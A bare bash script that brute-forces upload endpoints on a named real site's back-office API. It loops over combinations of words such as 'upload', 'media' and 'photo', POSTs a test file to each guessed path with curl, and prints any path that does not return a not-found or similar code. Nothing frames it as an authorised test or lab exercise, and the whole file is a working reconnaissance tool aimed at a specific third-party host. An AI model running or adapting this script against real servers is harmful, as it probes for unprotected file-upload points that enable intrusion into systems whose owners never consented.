#!/bin/bash
host="https://backoffice.bangladeshguardian.com"
prefixes=("/api-en" "/api")
words=("upload" "save" "store" "add" "create" "media" "image" "img" "photo" "file" "photocard")

for pre in "${prefixes[@]}"; do
  for w1 in "${words[@]}"; do
    for w2 in "${words[@]}"; do
      if [ "$w1" == "$w2" ]; then continue; fi
      for sep in "" "-" "_"; do
        path="$pre/$w1$sep$w2"
        # Try POST with -F "image=@test.txt"
        code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -F "image=@test.txt" "$host$path")
        if [ "$code" != "404" ] && [ "$code" != "405" ] && [ "$code" != "000" ] && [ "$code" != "301" ]; then
          echo "FOUND: POST $path (image) -> $code"
        fi

        # Try POST with -F "file=@test.txt"
        code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -F "file=@test.txt" "$host$path")
        if [ "$code" != "404" ] && [ "$code" != "405" ] && [ "$code" != "000" ] && [ "$code" != "301" ]; then
          echo "FOUND: POST $path (file) -> $code"
        fi
      done
    done

    # Also try single words
    path="$pre/$w1"
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -F "image=@test.txt" "$host$path")
    if [ "$code" != "404" ] && [ "$code" != "405" ] && [ "$code" != "000" ] && [ "$code" != "301" ]; then
      echo "FOUND: POST $path (image) -> $code"
    fi
  done
done
